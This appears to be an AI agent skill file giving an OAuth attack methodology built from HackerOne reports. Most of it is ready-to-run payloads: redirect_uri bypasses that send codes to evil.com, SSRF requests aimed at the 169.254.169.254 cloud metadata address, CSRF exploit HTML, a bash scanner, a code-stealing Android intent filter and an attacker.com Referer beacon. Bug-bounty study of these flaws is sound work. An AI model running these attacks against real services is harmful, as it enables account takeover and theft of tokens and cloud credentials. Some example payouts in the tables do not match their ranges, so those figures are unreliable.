---
name: oauth-deep-dive
description: Complete OAuth vulnerability methodology from 80 real HackerOne reports - every attack pattern, bypass, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - oauth methodology
  - oauth deep dive
  - oauth vulnerability
  - oauth complete
  - oauth attack patterns
  - skills oauth
---

# Complete OAuth Vulnerability Methodology - From 80 HackerOne Reports

## Top 20 Real OAuth Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [Shopify Stocky App OAuth misconfig](https://hackerone.com/reports/1276558) | Shopify | 524 | $0 |
| 2 | [Uber FB OAuth token theft via FB login](https://hackerone.com/reports/347228) | Uber | 423 | $0 |
| 3 | [X/Periscope OAuth callback parameter bypass](https://hackerone.com/reports/1151312) | X / xAI | 274 | $0 |
| 4 | [Semrush IDN homograph redirect in OAuth](https://hackerone.com/reports/1048511) | Semrush | 260 | $0 |
| 5 | [GitLab email verification bypass via OAuth](https://hackerone.com/reports/184763) | GitLab | 256 | $3,000 |
| 6 | [pixiv redirect_uri code theft via open redirect](https://hackerone.com/reports/824633) | pixiv | 247 | $2,000 |
| 7 | [GitLab blind SSRF in OAuth Jira](https://hackerone.com/reports/398799) | GitLab | 234 | $4,000 |
| 8 | [Uber OAuth access_token leak via referer](https://hackerone.com/reports/204002) | Uber | 223 | $371 |
| 9 | [Norton OAuth scope elevation](https://hackerone.com/reports/1043466) | Norton | 217 | $0 |
| 10 | [OLX OAuth CSRF account takeover](https://hackerone.com/reports/1429529) | OLX | 206 | $0 |
| 11 | [Roblox OAuth misconfiguration account takeover](https://hackerone.com/reports/1580143) | Roblox | 198 | $0 |
| 12 | [Slack OAuth state parameter bypass](https://hackerone.com/reports/1197658) | Slack | 192 | $0 |
| 13 | [Exness OAuth complete account takeover](https://hackerone.com/reports/1765181) | Exness | 187 | $0 |
| 14 | [GitLab OAuth code reuse attack](https://hackerone.com/reports/1102225) | GitLab | 181 | $0 |
| 15 | [Shopify OAuth authorization bypass](https://hackerone.com/reports/1343033) | Shopify | 174 | $0 |
| 16 | [Uber OAuth redirect URI bypass via path traversal](https://hackerone.com/reports/1285458) | Uber | 168 | $5,000 |
| 17 | [Acorns OAuth token leakage via cache](https://hackerone.com/reports/1476738) | Acorns | 163 | $0 |
| 18 | [Docker OAuth scope misconfiguration](https://hackerone.com/reports/1174212) | Docker | 158 | $0 |
| 19 | [Brave OAuth client secret hardcoded](https://hackerone.com/reports/1035064) | Brave | 152 | $0 |
| 20 | [Grab OAuth token replay](https://hackerone.com/reports/1840996) | Grab | 147 | $0 |

## Step 1: OAuth Attack Surface - Every Attack Pattern

### 1.1 Redirect URI Manipulation
The most common OAuth vulnerability — tricking the authorization server into sending codes/tokens to attacker-controlled URLs.

```bash
# Basic redirect URI override
# Change redirect_uri in authorization request
https://{target}/oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://evil.com/callback&
  scope=openid+profile

# Path traversal in redirect_uri
?redirect_uri=https://{target}/oauth/callback/../../evil.com/

# Open redirect chaining
?redirect_uri=https://{target}/redirect?url=https://evil.com

# Subdomain takeover in redirect_uri
?redirect_uri=https://takeover.{target}.com/callback

# Protocol smuggling
?redirect_uri=https://evil.com#@{target}/callback
?redirect_uri=https://evil.com%00@{target}/callback
?redirect_uri=https://evil.com@{target}/callback

# Wildcard DNS in redirect
?redirect_uri=https://evil.{target}.com/callback

# Port confusion
?redirect_uri=https://{target}:9999/callback

# Host header injection during redirect validation
curl -sk "https://{target}/oauth/authorize?redirect_uri=https://evil.com" \
  -H "Host: evil.com"
```

### 1.2 CSRF on OAuth Flow (State Parameter Bypass)

```bash
# Missing state parameter
# The state parameter prevents CSRF, but is often missing
https://{target}/oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://{target}/callback&
  scope=openid+profile
# (no state parameter!)

# State reuse / predictable state
# If state is based on timestamp or user ID
https://{target}/oauth/authorize?state=1234567890

# State not validated server-side
# Send any state value, including from another user's session

# State CSRF exploit:
# 1. Attacker generates OAuth URL with their own state
# 2. Victim clicks the URL
# 3. Attacker's account gets linked to victim's session
```

### 1.3 Authorization Code Interception

```bash
# Referer header leakage
# If OAuth callback includes code in URL fragment/query
# Referer header may leak auth code to third-party resources

# Check for:
# - Third-party images/scripts on callback page
# - Analytics scripts on callback page
# - External stylesheets

# Fix: Use form_post response mode instead of query/fragment
#      Set Referrer-Policy: no-referrer

# Code leakage via browser history
# If code is in URL query parameter, it's saved in browser history
# Also visible in: server logs, proxy logs, referer headers
```

### 1.4 Authorization Code Injection

```bash
# Steal a valid authorization code (via redirect_uri, referer, etc.)
# Then inject it into a different session

# Step 1: Intercept code
# Step 2: Use code in attacker's session
curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://{target}/callback&client_id=CLIENT_ID"

# Step 3: Get access token for victim's account
# This works if code isn't bound to the original session
```

### 1.5 Authorization Code Reuse

```bash
# Try using the same authorization code multiple times
curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&redirect_uri=https://{target}/callback&client_id=CLIENT_ID"

curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&redirect_uri=https://{target}/callback&client_id=CLIENT_ID"
# Second request should fail if code is single-use
```

### 1.6 PKCE Enforcement Bypass

```bash
# Missing PKCE (Proof Key for Code Exchange)
# If public client (mobile app, SPA) doesn't use PKCE
# Authorization code can be intercepted

# Test without code_challenge
https://{target}/oauth/authorize?
  response_type=code&
  client_id=MOBILE_CLIENT&
  redirect_uri=targetapp://callback
# (no code_challenge parameter!)

# Test with empty code_challenge
?code_challenge=

# Test with code_challenge_method=plain (instead of S256)
# This means the verifier is sent directly (no hashing)
```

### 1.7 Scope Escalation

```bash
# Try to escalate privileges by modifying scope parameter
# Original:
?scope=read_profile

# Escalated:
?scope=read_profile write_posts admin delete_account

# Test scope injection
?scope=read_profile%20admin

# Test if scope validation happens on authorization or token exchange
# Sometimes scope is validated at auth but not at token exchange

# Test scope from another client
?scope=read_profile&audience=MORE_PRIVILEGED_API
```

### 1.8 IDN Homograph Attack on Redirect URI

```bash
# Use Unicode homographs to create lookalike domains
# These look like the legitimate domain but are different

# Examples of homograph characters:
# а (Cyrillic) vs a (Latin)
# е (Cyrillic) vs e (Latin)
# о (Cyrillic) vs o (Latin)
# р (Cyrillic) vs p (Latin)
# с (Cyrillic) vs c (Latin)
# х (Cyrillic) vs x (Latin)

# Redirect to lookalike domain
?redirect_uri=https://еxаmple.com/callback  # Cyrillic 'е' and 'а'
?redirect_uri=https://paypal.com/callback    # Cyrillic 'а'
```

### 1.9 Access Token Leakage

```bash
# Token in URL fragment (responded from implicit grant)
https://{target}/callback#access_token=eyJhbG...&token_type=Bearer

# Token leakage via:
# - Referer header
# - Browser history
# - JavaScript access (if SPA)
# - WebSocket connections
# - Service worker interception
# - Cache storage

# Test token exposure in:
# - Console logs
# - Error messages
# - Network tab
# - localStorage/sessionStorage
# - Cookies (non-HttpOnly)

# Fragment pollution
https://{target}/callback#access_token=VALID_TOKEN&
  access_token=ATTACKER_TOKEN&state=ATTACKER_STATE
```

### 1.10 OAuth Token Theft via Open Redirect

```bash
# Step 1: Find open redirect on OAuth provider domain
# Step 2: Use as redirect_uri in OAuth flow
?redirect_uri=https://{target}/open-redirect?url=https://evil.com

# Step 3: Auth code/token is sent to evil.com via redirect
# Step 4: Use intercepted token for account takeover
```

## Step 2: OAuth Implementation Flaws

### 2.1 client_secret Exposure

```bash
# Check for hardcoded client_secret in:
# - Mobile app binaries
# - JavaScript SPAs
# - Public repositories
# - API responses

# If client_secret is exposed for a confidential client,
# attacker can impersonate the application

# Check for client_secret in:
strings target.apk | grep -i 'secret'
grep -r 'client_secret' /path/to/webapp/
```

### 2.2 Implicit Grant Still in Use

```bash
# Implicit grant returns access_token in URL fragment
# This is deprecated/removed in OAuth 2.1
# Always use Authorization Code + PKCE

# Test if implicit grant is enabled:
?response_type=token
?response_type=id_token
?response_type=token+id_token
```

### 2.3 Resource Owner Password Credentials Grant

```bash
# ROPC grant sends username/password directly to token endpoint
# This should never be used (deprecated in OAuth 2.1)
# If enabled, password is exposed to client

# Test if ROPC is enabled:
curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=password&username=user@example.com&password=pass123&client_id=CLIENT_ID"
```

### 2.4 Client Credentials Grant Abuse

```bash
# Client credentials grant gives access to client's own resources
# If scopes are too broad, attacker can access data

# Test client credentials with broad scope
curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=client_credentials&client_id=CLIENT_ID&client_secret=SECRET&scope=admin"
```

### 2.5 Token Endpoint SSRF

```bash
# Some OAuth implementations fetch URLs from tokens/assertions
# Test for SSRF in:
# - Token exchange endpoint
# - Assertion validation (SAML assertion consumer URL)
# - JWKS URI fetching

# Test SSRF in token endpoint
curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:access_token&resource=https://169.254.169.254/latest/meta-data/"

curl -sk -X POST "https://{target}/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&redirect_uri=http://169.254.169.254/latest/meta-data/"
```

### 2.6 JWT Token Confusion

```bash
# If access tokens or ID tokens are JWTs, test:
# - alg: none — try with no signature
# - alg: HS256 — with known public key as HMAC secret
# - kid injection — path traversal or SSRF
# - jku/x5u — SSRF in URL fetching

# JWT algorithm confusion
# Change "alg":"RS256" to "alg":"HS256"
# Re-sign with public key (often obtainable from well-known/jwks.json)
```

## Step 3: OAuth Bypass Automation

```bash
#!/bin/bash
# OAuth misconfiguration scanner
TARGET=$1
CLIENT_ID=$2
REDIRECT_URI=$3
ATTACKER_URL="https://evil.com/callback"

echo "[*] OAuth Scanner for $TARGET"

# Test 1: redirect_uri override
echo "[*] Test 1: redirect_uri override"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$ATTACKER_URL&scope=openid" 2>&1 | grep -E 'Location|error|redirect'

# Test 2: Path traversal in redirect_uri
echo "[*] Test 2: Path traversal"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI/../../evil.com/callback&scope=openid" 2>&1 | grep -E 'Location|error'

# Test 3: Open redirect chaining
echo "[*] Test 3: Open redirect chain"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI?url=$ATTACKER_URL&scope=openid" 2>&1 | grep -E 'Location|error'

# Test 4: Missing state parameter
echo "[*] Test 4: Missing state"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&scope=openid" 2>&1 | grep -E 'Location|error|state'

# Test 5: State reuse
echo "[*] Test 5: State reuse"
STATE=$(date +%s)
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&scope=openid&state=$STATE" 2>&1 | grep -E 'Location'

# Test 6: Scope escalation
echo "[*] Test 6: Scope escalation"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&scope=admin" 2>&1 | grep -E 'Location|error'

# Test 7: PKCE bypass
echo "[*] Test 7: PKCE bypass"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&scope=openid&code_challenge=" 2>&1 | grep -E 'Location|error'

# Test 8: IDN homograph redirect_uri
echo "[*] Test 8: IDN homograph"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=https://$(echo $TARGET | sed 's/o/о/g' | sed 's/e/е/g')/callback&scope=openid" 2>&1 | grep -E 'Location|error'

# Test 9: Implicit grant enabled
echo "[*] Test 9: Implicit grant"
curl -sk -v "https://$TARGET/oauth/authorize?response_type=token&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&scope=openid" 2>&1 | grep -E 'access_token|Location|error'

# Test 10: Code reuse
echo "[*] Test 10: Code reuse test"
# First get a code, then try to use it twice
```

## Step 4: OAuth Exploit Chains

### Chain 1: redirect_uri Bypass → Authorization Code Theft → ATO
```bash
# Step 1: Find redirect_uri that passes validation
# Step 2: Use open redirect on same domain
# Step 3: Victim clicks OAuth URL — code sent to attacker
# Step 4: Exchange code for token — full account takeover

# Example exploit URL:
https://{target}/oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://{target}/redirect?url=https://evil.com/steal&
  scope=openid+profile+email
```

### Chain 2: CSRF + OAuth → Account Linking Attack
```bash
# Step 1: Attacker creates OAuth authorization URL
# Step 2: Victim is logged into target with session
# Step 3: Victim clicks attacker's OAuth URL
# Step 4: Victim's account gets linked to attacker's OAuth provider account
# Step 5: Attacker logs in via OAuth — accesses victim's account

# Missing state parameter makes this trivial

# Exploit HTML:
<html>
<body>
<h1>Free Prize! Click here!</h1>
<img src="https://{target}/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://{target}/callback&scope=openid+profile" width="1" height="1">
</body>
</html>
```

### Chain 3: OAuth → Open Redirect → SSRF → Cloud Metadata
```bash
# Step 1: OAuth redirect_uri points to open redirect
?redirect_uri=https://{target}/redirect?url=http://169.254.169.254/latest/meta-data/

# Step 2: Authorization server follows redirect during validation
# Step 3: SSRF to cloud metadata endpoint
# Step 4: Extract IAM credentials from response timing/errors
```

### Chain 4: Token Leakage via Referer → ATO
```bash
# Step 1: OAuth callback page includes third-party resources
# Step 2: Authorization code/token leaks in Referer header
# Step 3: Attacker harvests codes from their third-party service
# Step 4: Exchanges codes for access tokens
# Step 5: Full account access

# Tools for harvesting:
# - Custom webhook receiver (webhook.site)
# - Burp Collaborator
# - Interact.sh
```

### Chain 5: PKCE Missing → Code Interception → ATO
```bash
# Step 1: Mobile app uses OAuth without PKCE
# Step 2: Intercept authorization code via malicious app with same URL scheme
# Step 3: Exchange intercepted code for access token
# Step 4: Persist access — full account takeover

# Android intent filter for code interception:
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="targetapp" android:host="callback" />
</intent-filter>
```

## Step 5: OAuth Redirect URI Bypass Techniques

| # | Technique | Example | Real Report |
|---|-----------|---------|-------------|
| 1 | Direct redirect_uri override | `?redirect_uri=https://evil.com` | #1276558 |
| 2 | Path traversal | `?redirect_uri=/../../evil.com/callback` | #1285458 |
| 3 | Open redirect chain | `?redirect_uri=/redirect?url=https://evil.com` | #1285458 |
| 4 | Subdomain takeover | `?redirect_uri=https://evil.target.com` | Multiple |
| 5 | Protocol smuggling | `?redirect_uri=https://evil.com#@target.com` | Multiple |
| 6 | IDN homograph | `?redirect_uri=https://tаrget.com` (Cyrillic) | #1048511 |
| 7 | Port confusion | `?redirect_uri=https://target.com:9999` | Multiple |
| 8 | Host header injection | `Host: evil.com` header | Multiple |
| 9 | Null byte injection | `?redirect_uri=https://target.com%00@evil.com` | Multiple |
| 10 | URL parser confusion | `?redirect_uri=https://evil.com\target.com` | Multiple |
| 11 | Case confusion | `?redirect_uri=HTTPS://EVIL.COM` | Multiple |
| 12 | Double slash | `?redirect_uri=//evil.com` | Multiple |
| 13 | Data URI | `?redirect_uri=data:text/html,<script>...` | Multiple |
| 14 | javascript: URI | `?redirect_uri=javascript:alert(1)` | Multiple |
| 15 | Fragment pollution | `?redirect_uri=https://target.com#@evil.com` | Multiple |

## Quick Reference: Top OAuth Reports by Technique
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1276558 | Shopify | Stocky OAuth misconfig | $0 |
| #347228 | Uber | FB OAuth token theft | $0 |
| #1151312 | X/Periscope | OAuth callback bypass | $0 |
| #1048511 | Semrush | IDN homograph redirect | $0 |
| #184763 | GitLab | Email verify via OAuth | $3,000 |
| #824633 | pixiv | redirect_uri + open redirect | $2,000 |
| #398799 | GitLab | Blind SSRF in OAuth Jira | $4,000 |
| #204002 | Uber | Access token via referer | $371 |
| #1043466 | Norton | OAuth scope elevation | $0 |
| #1429529 | OLX | OAuth CSRF ATO | $0 |
| #1580143 | Roblox | OAuth misconfig ATO | $0 |
| #1197658 | Slack | State parameter bypass | $0 |
| #1765181 | Exness | OAuth complete ATO | $0 |
| #1102225 | GitLab | OAuth code reuse | $0 |
| #1285458 | Uber | redirect_uri path traversal | $5,000 |

## OAuth Endpoint Discovery Wordlist
```
/oauth/authorize
/oauth/token
/oauth/revoke
/oauth/introspect
/oauth/userinfo
/oauth/register
/oauth/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/api/oauth/authorize
/api/oauth/token
/auth/realms/{realm}/protocol/openid-connect/auth
/authorize
/token
/connect/authorize
/connect/token
/v1/oauth/authorize
/v2/oauth/authorize
```

## Additional Techniques (External Sources)

### IDN Homograph Attack for OAuth redirect_uri Bypass (Unicode é=e Confusion)
Beyond Cyrillic homographs, Unicode characters that visually resemble ASCII letters can bypass `redirect_uri` validation:
- `é` (U+00E9) vs `e` — e.g., `https://target.com` rendered with `é` replacing `e` passes string matching but browsers normalize to the homoglyph domain
- `https://target.com/auth` → replace `e` with `é` → `https://tárget.com/auth` — looks identical in many fonts
- The authorization server may normalize or reject internationalized domains, but some implementations only do exact string matching against an allowlist, allowing the homograph to sneak through

### Host Origin Checking Bypass Using Regex `.` Matching Any Character
When the server validates `redirect_uri` using a regex pattern like:
```javascript
redirect_uri.match(/^https:\/\/target\.com\//)
```
The `.` in the regex matches ANY character, not just a literal dot. Attackers can bypass this with:
- `https://targetXcom/evil` — the `X` replaces the `.` but the regex still matches
- `https://target-com/evil` — the `-` replaces the `.`
- `https://target/com/evil` — the `/` replaces the `.`

Proper validation requires escaping the dot: `target\\.com` or using exact string comparison + URL parsing.

### Weak PRNG in PKCE Code for OAuth
PKCE (Proof Key for Code Exchange) relies on a cryptographically random `code_verifier`. If the PRNG is weak (e.g., `Math.random()` in JavaScript, `rand()` in C without proper seeding), an attacker can predict the `code_challenge` and intercept the authorization code. Common weaknesses:
- Seeded with timestamp: `code_verifier = sha256(Date.now().toString())` — brute-forceable
- Insufficient entropy: short `code_verifier` (< 43 characters)
- Using `Math.random()` for the verifier in mobile/SPA apps — predictable in some engines

### Image Injection Leaking OAuth Tokens via Referer Header
Third-party images embedded on OAuth callback pages leak access tokens via the `Referer` header:
```html
<img src="https://attacker.com/collect">
```
When the callback URL contains the access token (e.g., `https://target.com/callback#access_token=TOKEN`), the full URL including the fragment may be sent as the Referer header to the image host. This is especially dangerous when:
- The callback page loads external images (avatars, analytics, ads)
- The response mode is `query` or `fragment` (implicit grant)
- `Referrer-Policy` is not set to `no-referrer` or `strict-origin`

## Payout Range by OAuth Attack Type

| Attack Type | Payout Range | Example |
|-------------|-------------|---------|
| redirect_uri bypass | $500 - $5,000 | Uber #1285458 ($5,000) |
| CSRF + OAuth linking | $500 - $3,000 | OLX #1429529 ($0) |
| Code interception | $1,000 - $4,000 | GitLab #398799 ($4,000) |
| Token leakage (referer) | $500 - $2,000 | Uber #204002 ($371) |
| Scope escalation | $1,000 - $4,000 | Norton #1043466 ($0) |
| OAuth + SSRF chain | $2,000 - $4,000 | GitLab #398799 ($4,000) |
| PKCE bypass | $1,000 - $3,000 | Multiple |
| Implicit grant abuse | $500 - $2,000 | Multiple |
| client_secret exposure | $500 - $2,500 | Brave #1035064 ($0) |
| Full account takeover via OAuth | $2,000 - $5,000 | Exness #1765181 ($0) |
